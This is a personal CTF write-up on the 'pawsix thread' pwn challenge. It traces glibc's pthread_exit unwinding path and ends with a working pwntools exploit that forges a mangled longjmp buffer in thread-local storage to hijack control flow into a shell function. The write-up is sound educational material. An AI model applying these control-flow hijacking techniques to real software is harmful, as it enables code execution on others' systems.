---
title: "SkateboardingDog CTF-26: Pawsix Thread Pwn Writeup"
date: 2026-09-27
categories: 
  - "reverse-engineering"
  - "pwn"
tags: 
  - "pwn"
  - "ctf"
  - "skateboardingdog"
  - "binary exploitation"
  - "writeup"
---

BSIDES Canberra 2026's CTF was organised by SkateboardingDog again this year. Last year, without knowing much about pwn I tried to learn and solve their easiest pwn challenge during the CTF and I failed. That event pushed me to learn binary exploitation, and I have been trying to solve pwn challenges regularly since then.

Today I got a writeup for `pawsix thread` challenge. Only pwn challenge I managed to solve during the CTF :( My aim was to solve one, but I was secretly hoping that I can at least solve two. Anyways, I got humbled by their nicely created pwn challenges. At least I got this one to write about :)

Be aware, this is going to be a long documentation of me going through libc code. Don't tell me I didn't warn you...


## Source Code

We are directly given source code, so we can directly look at this instead of going through Ghidra's decompiled output. 

```c++
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>

#define TSIZE 0x940

void win() {
    system("/bin/sh");
}

void *thread_func(void *arg) {
    pthread_t self = pthread_self();

    printf("My pthread @ %p: ", (void*)self);

    for (size_t i = 0; i < TSIZE; i++) {
        printf("%02x", ((unsigned char*)self)[i]);
    }
    printf("\n");

    puts("Now, give me your pthread:");
    read(0, (void*)self, TSIZE);

    pthread_exit(NULL);
    return NULL;
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    pthread_t t;
    pthread_create(&t, NULL, thread_func, win);
    pthread_join(t, NULL);
    return 0;
}
```

Source code is quite straighforward:

1. A thread function runs in a new thread.

2. Main calls join to wait that thread to finish.

3. We are provided with the thread's TLS. We can then modify that TLS however we want

4. Thread exits with `pthread_exit`

Looking at this code, it looks like we need to understand what `pthread_exit` is doing to figure out what we need to modify in the context to return back to `win` function. Seems simple enough, but still took me 4-5 hours to debug and understand all of this :)

## LIBC - NPTL

Before I dive into this, I want to make things clear: `Our goal here is to find a piece of code in libc that executes/calls/jumps to a place by using the printed TLS structure/buffer.` If it uses something from that structure to change the flow of the code, that means we can modify that part to change flow to whatever we want. I will now continue with diving into libc code, but keep in mind that the main thing I'm looking for is a piece of code where we can control the flow.

Native Posix Thread Library (NPTL) implements the thread functionality in libc. Reading the libc code seemed to be the best way to understand what it does when the thread is exiting. I used this libc source code viewer? to check it: <https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/pthread_exit.c#L39> It offers additional functionality like reference search etc. This is how `pthread_exit` is implemented in glibc 2.39 (I think that was the libc version used in the challenge):

```c++
void __pthread_exit (void *value)
{
  {
    struct unwind_link *unwind_link = __libc_unwind_link_get ();
    if (unwind_link == NULL)
      __libc_fatal (LIBGCC_S_SO
                    " must be installed for pthread_exit to work\n");
  }

  THREAD_SETMEM (THREAD_SELF, result, value);

  __do_cancel ();
}
libc_hidden_def (__pthread_exit)
weak_alias (__pthread_exit, pthread_exit)
```

`__do_cancel` is our next target, it handles the actual thread cleanup routine:

```c++
/* Called when a thread reacts on a cancellation request.  */
static inline void
__attribute ((noreturn, always_inline))
__do_cancel (void)
{
  struct pthread *self = THREAD_SELF;

  /* Make sure we get no more cancellations.  */
  atomic_fetch_or_relaxed (&self->cancelhandling, EXITING_BITMASK);

  __pthread_unwind ((__pthread_unwind_buf_t *)
		    THREAD_GETMEM (self, cleanup_jmp_buf));
}
```

We have some important details here that we can make use of:

1. Thread self is the pthread structure that we are given arbitrary write access to in the challenge.

2. It calls `__pthread_unwind` with a pointer to self->cleanup_jmp_buf

Following the trail of `__pthread_unwind_buf_t` structure pointer given to the unwind function, we can eventually see that buffer is a type of longjump buffer:

```c++
typedef struct
{
  struct __cancel_jmp_buf_tag __cancel_jmp_buf[1];
  void *__pad[4];
} __pthread_unwind_buf_t __attribute__ ((__aligned__));

struct __cancel_jmp_buf_tag
{
  __jmp_buf __cancel_jmp_buf;
  int __mask_was_saved;
};

/* Jump buffer contains:
   x19-x28, x29(fp), x30(lr), (x31)sp, d8-d15.  Other registers are not
   saved.  */
__extension__ typedef unsigned long long __jmp_buf [22];
```

This immediately reminded me the challenge from last year I couldn't solve: <https://github.com/skateboardingdog/bsides-cbr-2025-challenges/tree/main/pwn/dockjmp>  Colour me PTSD! This was the challenge that started my whole pwn journey :) I had to solve this year's one. 

What this told me was unwind receives a pointer to a jump buffer, and jump buffers contain an address to jump to - even though they are mangled. So we can use that to change what function it calls from that jump buffer. To understand how this jump buffer is used, we need to check `__pthread_unwind` next:

```c++
void
__cleanup_fct_attribute __attribute ((noreturn))
__pthread_unwind (__pthread_unwind_buf_t *buf)
{
  struct pthread_unwind_buf *ibuf = (struct pthread_unwind_buf *) buf;
  struct pthread *self = THREAD_SELF;

  /* This is not a catchable exception, so don't provide any details about
     the exception type.  We do need to initialize the field though.  */
  THREAD_SETMEM (self, exc.exception_class, 0);
  THREAD_SETMEM (self, exc.exception_cleanup, &unwind_cleanup);

  _Unwind_ForcedUnwind (&self->exc, unwind_stop, ibuf);
  /* NOTREACHED */

  /* We better do not get here.  */
  abort ();
}
libc_hidden_def (__pthread_unwind)
```

Here this line is important for us: `_Unwind_ForcedUnwind (&self->exc, unwind_stop, ibuf);` we are going deeper into unwind mechanics in libc. ibuf is the same `__pthread_unwind_buf_t` jump buffer we are interested in. self->exc is unwind's exception handler thingy. Next step is to see how forced unwind uses the `ibuf` jump buffer:

```c++
_Unwind_Reason_Code
_Unwind_ForcedUnwind (struct _Unwind_Exception *exc, _Unwind_Stop_Fn stop,
                      void *stop_argument)
{
  return UNWIND_LINK_PTR (link (), _Unwind_ForcedUnwind)
    (exc, stop, stop_argument);
} 
```

Doesn't look much interesting. What I make of this is that stop function is called with the jump buffer at some point. So I decided to look at `unwind_stop` function that was the input parameter to this function:

```c++
static _Unwind_Reason_Code
unwind_stop (int version, _Unwind_Action actions,
	     _Unwind_Exception_Class exc_class,
	     struct _Unwind_Exception *exc_obj,
	     struct _Unwind_Context *context, void *stop_parameter)
{
  struct pthread_unwind_buf *buf = stop_parameter;
  struct pthread *self = THREAD_SELF;
  struct _pthread_cleanup_buffer *curp = THREAD_GETMEM (self, cleanup);
  int do_longjump = 0;

  /* Adjust all pointers used in comparisons, so that top of thread's
     stack is at the top of address space.  Without that, things break
     if stack is allocated above the main stack.  */
  uintptr_t adj = (uintptr_t) self->stackblock + self->stackblock_size;

  /* Do longjmp if we're at "end of stack", aka "end of unwind data".
     We assume there are only C frame without unwind data in between
     here and the jmp_buf target.  Otherwise simply note that the CFA
     of a function is NOT within it's stack frame; it's the SP of the
     previous frame.  */
  if ((actions & _UA_END_OF_STACK)
      || ! _JMPBUF_CFA_UNWINDS_ADJ (buf->cancel_jmp_buf[0].jmp_buf, context,
				    adj))
    do_longjump = 1;

  if (__glibc_unlikely (curp != NULL))
    {
      /* Handle the compatibility stuff.  Execute all handlers
	 registered with the old method which would be unwound by this
	 step.  */
      struct _pthread_cleanup_buffer *oldp = buf->priv.data.cleanup;
      void *cfa = (void *) (_Unwind_Ptr) _Unwind_GetCFA (context);

      if (curp != oldp && (do_longjump || FRAME_LEFT (cfa, curp, adj)))
	{
	  do
	    {
	      /* Pointer to the next element.  */
	      struct _pthread_cleanup_buffer *nextp = curp->__prev;

	      /* Call the handler.  */
	      curp->__routine (curp->__arg);

	      /* To the next.  */
	      curp = nextp;
	    }
	  while (curp != oldp
		 && (do_longjump || FRAME_LEFT (cfa, curp, adj)));

	  /* Mark the current element as handled.  */
	  THREAD_SETMEM (self, cleanup, curp);
	}
    }

  DIAG_PUSH_NEEDS_COMMENT;
#if __GNUC_PREREQ (7, 0)
  /* This call results in a -Wstringop-overflow warning because struct
     pthread_unwind_buf is smaller than jmp_buf.  setjmp and longjmp
     do not use anything beyond the common prefix (they never access
     the saved signal mask), so that is a false positive.  */
  DIAG_IGNORE_NEEDS_COMMENT (11, "-Wstringop-overflow=");
#endif
  if (do_longjump)
    __libc_unwind_longjmp ((struct __jmp_buf_tag *) buf->cancel_jmp_buf, 1);
  DIAG_POP_NEEDS_COMMENT;

  return _URC_NO_REASON;
}
```

Here we arrived at the critical part of this investigation finally: `__libc_unwind_longjmp`. We can see, well sort of we can see around all the mess in the code, that longjump is called at the end with the jump buffer we have been following around. I am honestly impressed whoever writes/maintains libc code. That thing would haunt me in my dreams if that was my job. The more I read libc code, the more I am surprised everything works cleanly in our PCs. Anyways,  

At this point, I was a bit familiar with long jump mechanics from last year's challenge. So I didn't dive deeper into the code, but for completeness' sake, here register references used in longjump call:

```c++
#define JB_RBX	0
#define JB_RBP	1
#define JB_R12	2
#define JB_R13	3
#define JB_R14	4
#define JB_R15	5
#define JB_RSP	6
#define JB_PC	7
#define JB_SIZE (8*8)

// I will just sneak this in here, unwind's longjump is same as normal longjump:
/* We use the normal longjmp for unwinding.  */
#define __libc_unwind_longjmp(buf, val) __libc_longjmp (buf, val)

// I don't want to paste whole longjump assembly, here is the most important part
// RSP, PC, and RBP is restored by DEMANGLING:
	/* Restore registers.  */
	mov (JB_RSP*8)(%rdi),%R8_LP
	mov (JB_RBP*8)(%rdi),%R9_LP
	mov (JB_PC*8)(%rdi),%RDX_LP
#ifdef PTR_DEMANGLE
	PTR_DEMANGLE (%R8_LP)
	PTR_DEMANGLE (%R9_LP)
	PTR_DEMANGLE (%RDX_LP)

```

We will be mainly interested in RSP and PC ones located at `index 6 and 7 here, so 48:56 and 56:64 in terms of bytes in the jump buffer array`. Also demangling is something we have to deal with. If you want to see more about how longjump is implemented in assembly, you can find a link down below to it.

That is taking longer than I expected. Honestly looking at the solution, I thought this would be a quick writeup. I guess I never end up with quick writeups :) Here are some links to related libc code for more interested readers, I am warning you though, once you start jumping around all the functions you might get lost:

1. pthread_exit: <https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/pthread_exit.c#L39>

2. do_cancel: <https://elixir.bootlin.com/glibc/glibc-2.39/source/sysdeps/nptl/pthreadP.h#L264>

3. pthread_unwind: <https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/unwind.c#L120>

4. Jumpbuffer offsets: <https://elixir.bootlin.com/glibc/glibc-2.39/source/sysdeps/x86_64/jmpbuf-offsets.h>

5. pthread TLS: <https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/descr.h#L130>

6. unwind_stop: <https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/unwind.c#L39>

7. Long jump assembly: <https://elixir.bootlin.com/glibc/glibc-2.39/source/sysdeps/x86_64/__longjmp.S>


### __libc_unwind_longjmp / __libc_longjmp

Okay I lied. I dived a bit deeper into this to show how things work in this documentation like writeup. I hope this is helpful for someone, whoever is reading this. First thing to note is that in jmpbuf-unwind.h, we see that __libc_unwind_longjmp is same as __libc_longjmp:

```c++
/* We use the normal longjmp for unwinding.  */
#define __libc_unwind_longjmp(buf, val) __libc_longjmp (buf, val)
```

Looking at `__libc_longjmp` implementation <https://elixir.bootlin.com/glibc/glibc-2.39/source/sysdeps/x86/longjmp.c#L31>:

```c++
void
__libc_longjmp (sigjmp_buf env, int val)
{
  /* Perform any cleanups needed by the frames being unwound.  */
  _longjmp_unwind (env, val);

  if (env[0].__mask_was_saved)
    /* Restore the saved signal mask.  */
    (void) __sigprocmask (SIG_SETMASK,
			  (sigset_t *) &env[0].__saved_mask,
			  (sigset_t *) NULL);

  /* Call the machine-dependent function to restore machine state
     without shadow stack.  */
  __longjmp_cancel (env[0].__jmpbuf, val ?: 1);
}
```

We can see two functions of interest here: `_longjmp_unwind` and `__longjmp_cancel`. Honestly I am a bit baffled as to why last function is called `__longjmp_cancel`. It is used to restore the state of registers like PC and RSP but somehow someone decided to name it with `_cancel` suffix. Those libc guys are something for sure :) Alright let's keep going:

```c++
// https://elixir.bootlin.com/glibc/glibc-2.39/source/sysdeps/nptl/jmp-unwind.c#L25
void
_longjmp_unwind (jmp_buf env, int val)
{
  __pthread_cleanup_upto (env->__jmpbuf, CURRENT_STACK_FRAME);
}

// https://elixir.bootlin.com/glibc/glibc-2.39/source/sysdeps/x86/__longjmp_cancel.S#L22
/* Don't restore shadow stack register for __longjmp_cancel.  */
#define DO_NOT_RESTORE_SHADOW_STACK
#define __longjmp __longjmp_cancel
```

Okay first function just calls another one `__pthread_cleanup_upto` and longjmp_cancel is just a fancy way of calling `__longjmp` assembly code I referenced above by defining a define to not restore shadow stack. I guess that is why maybe they used _cancel suffix. At this point, we reached our first solution, and I missed a second possible solution by not going into `__pthread_cleanup_upto` function.

## SOLUTIONS

I think solutions deserves their own big headline to separate them out from all the libc mess I have put here :) Well, during the CTF I was only focusing on only one solution to make it work, I didn't realize other possible solutions. Now that I am going over the libc in a clear mind across multiple days, I started realizing new possible solutions I could have used.

### Solution-1

Let's start with what I actually did during the CTF. First solution relies on `__longjmp` call we found above:

1. This journey started with this buffer: `THREAD_GETMEM (self, cleanup_jmp_buf))`. This cleanup_jmp_buf progresses through functions after functions. 

2. It finally ends in unwind_stop as `struct pthread_unwind_buf *buf`.

3. That pointer is dereferenced to access cancel_jmp_buf `__libc_unwind_longjmp ((struct __jmp_buf_tag *) buf->cancel_jmp_buf, 1);`

4. In that buffer cancel_jmp_buffer is just the first structure with a `__jmp_buf and a flag for checking if mask is saved`:
```c++
struct pthread_unwind_buf
{
  struct
  {
    __jmp_buf jmp_buf;
    int mask_was_saved;
  } cancel_jmp_buf[1];
```

5. Following that buffer, it goes to `__longjmp_cancel (env[0].__jmpbuf, val ?: 1);`

6. Which finally goes to `__longjmp` in the end

Okay a lot of words here, but in simple terms `the pointer at cleanup_jmp_buf in TLS is dereferenced to access __jmpbuf to call __longjump`. I should have maybe just written that instead of going through all this mess :) So the solution simply becomes:

1. Figure out the offset `cleanup_jmp_buf` is accessed from the TLS

2. Modify that to point somewhere we control in the memory we can write to

3. In that pointed area, create a fake __longjump buffer.

4. When __long_jump is accessed, remember it demangles RBP, RSP and PC. So we need to check where it gets the guard/secret/key to XOR, and shift is probably still 17. Here is a reference macros for mangling/demangling:
```c++
#  define PTR_MANGLE(reg)       xor __pointer_chk_guard_local(%rip), reg;    \
                                rol $2*LP_SIZE+1, reg
#  define PTR_DEMANGLE(reg)     ror $2*LP_SIZE+1, reg;                       \
                                xor __pointer_chk_guard_local(%rip), reg
```

Since the libc is demangling the jump buffer to jump to, what we need to do is mangle the `win()`. Well thanks to the last year's CTF, we already have these functions :) <https://github.com/skateboardingdog/bsides-cbr-2025-challenges/blob/main/pwn/dockjmp/solve/solve.py>

### Solution-2

This is something I realized during this writeup. So I didn't confirm if this works but looking at other people's solutions I think this is one of the ways they went with. Looking back at `unwind_stop` I realized there is a call here:

1. Get cleanup from TLS:  `struct _pthread_cleanup_buffer *curp = THREAD_GETMEM (self, cleanup);`

2. From what we can see in definition of this struct, it is a linked list with function pointers:
```c++
struct _pthread_cleanup_buffer
{
  void (*__routine) (void *);             /* Function to call.  */
  void *__arg;                            /* Its argument.  */
  int __canceltype;                       /* Saved cancellation type. */
  struct _pthread_cleanup_buffer *__prev; /* Chaining of cleanup functions.  */
};
```
3.  If a few checks passes `unwind_stop` actually calls that function pointer: `curp->__routine (curp->__arg);`

Do you realize something here? There is no mangling, no dealing with guards/secrets :) It is much cleaner and easier. During the CTF I was so fixated on the long jump buffer, I only followed it around and didn't realize there was a clean routine call here, smh. There you go, another possible solution with a clean call. For this one you need to figure out offset of `cleanup` in TLS, and then point it to a fake `_pthread_cleanup_buffer` that will contain the direct address of `win` function while making sure the checks in `unwind_stop` passes

### Solution-3

The more I look at the libc code, the more stuff I realize I could have used :) This is another possible solution I realized after the CTF. I'm not sure if I saw anyone using this, so maybe this is not a valid way, so take this with a grain of salt. 

Remember the function I didn't check above: `__pthread_cleanup_upto`. That function also receives a pointer to the jump buffer and also accesses the same `cleanup` struct from TLS:

```c++
void
__pthread_cleanup_upto (__jmp_buf target, char *targetframe)
{
  struct pthread *self = THREAD_SELF;
  struct _pthread_cleanup_buffer *cbuf;

  /* Adjust all pointers used in comparisons, so that top of thread's
     stack is at the top of address space.  Without that, things break
     if stack is allocated above the main stack.  */
  uintptr_t adj = (uintptr_t) self->stackblock + self->stackblock_size;
  uintptr_t targetframe_adj = (uintptr_t) targetframe - adj;

  for (cbuf = THREAD_GETMEM (self, cleanup);
       cbuf != NULL && _JMPBUF_UNWINDS_ADJ (target, cbuf, adj);
       cbuf = cbuf->__prev)
    {
#if _STACK_GROWS_DOWN
      if ((uintptr_t) cbuf - adj <= targetframe_adj)
        {
          cbuf = NULL;
          break;
        }
#elif _STACK_GROWS_UP
      if ((uintptr_t) cbuf - adj >= targetframe_adj)
        {
          cbuf = NULL;
          break;
        }
#else
# error "Define either _STACK_GROWS_DOWN or _STACK_GROWS_UP"
#endif

      /* Call the cleanup code.  */
      cbuf->__routine (cbuf->__arg);
    }

  THREAD_SETMEM (self, cleanup, cbuf);
}
```

Looks like a similar case to previous solution. `cbuf->__routine (cbuf->__arg);` Honestly I'm not going to bother diving more into this. Either solution-2 or solution-3 can be used to call `win` function without dealing with demangling.

## Debugging

I now had a general idea as how pthread exit was working and how it did call unwind functionality. It is now time we go through the debugging steps to see how these functions look in the debugger, what areas they access from the given dump etc. We are given the dump, and we know the code is accessing some fields, but we don't exactly know their positions in that memory dump. Before we dive into this, I will mention a few things:

1. I disabled ASLR in pwntools `context.aslr = False` with this I always get same memory addresses so it is easier to understand and follow.

2. I'm not sure if you get the same addresses as me but the dump address I got with ASLR off was: `0x7ffff7da76c0`. This is just to make it easier to calculate some offsets I will use later on.

3. So based on this address, here is some part of the dump we received, printed from debugger:

```
0x7ffff7da76c0: 0x00007ffff7da76c0      0x000055555555c2b0
0x7ffff7da76d0: 0x00007ffff7da76c0      0x0000000000000001
0x7ffff7da76e0: 0x0000000000000000      0x9c54cc4241502e00
0x7ffff7da76f0: 0xcfbdeaeaeeedeb7b      0x0000000000000000

0x7ffff7da77c0: 0x0000000000000000      0x0000000000000000
0x7ffff7da77d0: 0x0000000000000000      0x0000000000000000

0x7ffff7da79c0: 0x00007ffff7da6ee0      0x0000008000000000
```

4. Pwndbg also has a nice TLS visualizer that will present this information cleanly:

```bash
pwndbg> tls
Thread Local Storage (TLS) base: 0x7ffff7d876c0
TLS is located at:
    0x7ffff7588000     0x7ffff7d8b000 rw-p   803000       0 [anon_7ffff7588]
Dumping the address:
tcbhead_t @ 0x7ffff7d876c0
    0x00007ffff7d876c0 +0x0000 tcb                  : 0x7ffff7d876c0
    0x00007ffff7d876c8 +0x0008 dtv                  : 0x5555555592b0
    0x00007ffff7d876d0 +0x0010 self                 : 0x7ffff7d876c0
    0x00007ffff7d876d8 +0x0018 multiple_threads     : 0x1
    0x00007ffff7d876dc +0x001c gscope_flag          : 0x0
    0x00007ffff7d876e0 +0x0020 sysinfo              : 0x0
    0x00007ffff7d876e8 +0x0028 stack_guard          : 0xcddf86ffa1898900
    0x00007ffff7d876f0 +0x0030 pointer_guard        : 0x1efc5b341d4bd59
    0x00007ffff7d876f8 +0x0038 unused_vgetcpu_cache : {0, 0}
    0x00007ffff7d87708 +0x0048 feature_1            : 0x0
    0x00007ffff7d8770c +0x004c __glibc_unused1      : 0x0
    0x00007ffff7d87710 +0x0050 __private_tm         : {0x0, 0x0, 0x0, 0x0}
    0x00007ffff7d87730 +0x0070 __private_ss         : 0x0
    0x00007ffff7d87738 +0x0078 ssp_base             : 0x0
    0x00007ffff7d87740 +0x0080 __glibc_unused2      : 

pwndbg> fsbase
0x7ffff7d876c0
```

If you are careful, you might have noticed some values are different :) I am writing this writeup across several days, so different parts are written at different points in space-time continuum, so be aware.

For the purpose of understanding the flow and what the libc is doing, I took some debugging screenshots without modifying the TLS. This way we can see unmodified and clear version. 

From the libc analysis above for `Solution-1`, this is the rough call chain we are following:

```bash
pthread_exit -> _do_cancel -> __pthread_unwind  -> _Unwind_ForcedUnwind -> unwind_stop -> __longjump
```
During debuggin I actually couldn't see a function call to _do_cancel. I think it is inlined so whatever its doing is actually done in `pthread_exit`. So pthread_exit calls ` __pthread_unwind` with the jump buffer given as input:

![Pthread_unwind call](/assets/img/pawsix_unwind1.png)

We can notice in this call `input parameter, RDI, is set to fs[0x300] and fs = TLS`. We got our first offset, `0x300` used to access jump buffer. Next  `_Unwind_ForcedUnwind` is called by `__pthread_unwind`:

![Unwind ForcedUnwind](/assets/img/pawsix_unwind2.png)

This is roughly this part in the code `_Unwind_ForcedUnwind (&self->exc, unwind_stop, ibuf);`.  We can see the jumpbuffer pointer is being passed. So next we need to go into `unwind_close` to see where exactly it is used for longjump call:

![Longjump found](/assets/img/pawsix_unwind3.png)

Here we can still see the same buffer passed around from function to function. Then we can see demangling of __longjmp's implementation in `__longjmp_cancel`:

![Mangling](/assets/img/pawsix_mangle.png)

This part was just to confirm my assumption about longjump. We can see a few important details confirmed here:

1. fs[48] is used as the guard/secret for demangling. And we already got fs=TLS so we can get that secret leaked from the dump.

2. ror 17

3. Offsets we see from the offsets file jumpbuffer[48] -> rsp and jumpbuffer[56] -> RIP/PC

Eventually it jumps to that demangled address:  `0x7ffff7dd0194 <__longjmp_cancel+84>    jmp    rdx                         <start_thread+221>`

I think with this, I had everything I needed to implement the solution-1.

## Solution-1 Code

Finally we can talk about the code. I think the code is straightforward once you understand the method I discussed above, so I will just give you the final code and mention a few important things I faced during the CTF:

```python
from pwn import *


exe  = './pawsix_thread'
elf  = ELF(exe)
context.binary = elf

# context.log_level = 'debug'
# context.aslr = False
context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'Ubuntu']


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        p = remote('c.sk8.dog', 11101)
        return p
    else:
        return process([exe] + argv, *a, **kw)


def rol64(x, r):
    return ((x << r) & ((1<<64)-1)) | (x >> (64-r))

def ror64(x, r):
    return (x >> r) | ((x << (64-r)) & ((1<<64)-1))

def mangle(ptr, secret):
    return rol64((ptr ^ secret) & ((1<<64)-1), 17)


gdbscript = '''
b *thread_func
c
b *pthread_exit
b *pthread_exit+26
b *_Unwind_ForcedUnwind+26
b *unwind_stop+83
b *__pthread_cleanup_upto+61
b *__longjmp_cancel
b *__longjmp_cancel+84
set follow-fork-mode child
set detach-on-fork off
'''.format(**locals())    


p = start()

p.recvuntil(b'@ ')
tls_leak = int(p.recvuntil(b': ', drop=True),16)
print(f'{hex(tls_leak)}')

chunk = p.recvuntil(b'\n', drop=True)
chunk_b = bytes.fromhex(chunk.decode())

tls_again = u64(chunk_b[0:8])
win_leak  = u64(chunk_b[0x640:0x648])
secret_leak = u64(chunk_b[48:56])


print(f'{hex(tls_again)}')
print(f'{hex(win_leak)}')
print(f'{hex(secret_leak)}')

payload = bytearray(chunk_b)

# Tested a few random places in the buffer
target_rsp = (tls_again + 0x200) & ~0xf
target_rsp -= 8

# nice area, all zeros
my_area = 0x100
jmp_rsp = my_area + 0x30
jmp_rip = my_area + 0x38
payload[0x300:0x308] = p64(tls_again + my_area)

# Fake jump [48] -> mangled rsp pointer
mangled_rsp = mangle(target_rsp, secret_leak)
payload[jmp_rsp:jmp_rsp+8] = p64(mangled_rsp)
print(f'{hex(mangled_rsp)}')

# Fake jump [56] -> mangled win pointer
mangled_win = mangle(win_leak, secret_leak)
payload[jmp_rip:jmp_rip+8] = p64(mangled_win)
print(f'{hex(mangled_win)}')

p.sendline(payload)
p.interactive()
```

1. No need to leak PIE, win addrress is directly given `chunk_b[0x640:0x648]`

2. No need to leak libc base, we didn't need to use it. Though it is possible to leak it from the dump.

3. 0x300 is a pointer to our fake long jump buffer. So I changed it to point to somewhere in the dump with lots of zeros. 

4. With long jump buffer, we can set more registers, I found out only setting RSP and RIP/PC? was enough.

5. RSP was crucial part of the problem. I initially set it to a nice address like `0x7f86604bd8c0` but no matter where I tried in the buffer, it always failed. In the end I found out that I had to use `0x7f86604bd8c8` like this. Probably something to do with stack alignment and further rsp operations done on the given address. 

## Final Words

Finding the solution was the main part of this challenge. Going through functions after functions and figuring out how the magical libc works what we needed to do. I quite enjoyed that honestly, even though it took me 4-5 hours at night. I am so used to solving text book like challenges, I stopped actually understanding how it works. Like for example, I know heap stuff, tcache, long bins, house of apples 2 etc but when was the last time I actually checked how they implemented in libc? I can't answer that. This challenge reminded me that knowing how to solve by memorizing/copy pasting text book solutions won't always work. It is best to understand the underlying principles of the exploits. This was also evident in other challenges, they were quite different than the usual pwn challenges I solved. I had to understand the code, think about how to exploit it, rather than here is a format string/buffer overflow bug, do the solution kind of problems. It was quite refreshing and eye opener to me that I realized I wasn't going to be able to solve any other pwn challenge than this one.

Here to the more CTFs with this kind of pwn challenges. And as always keep learning!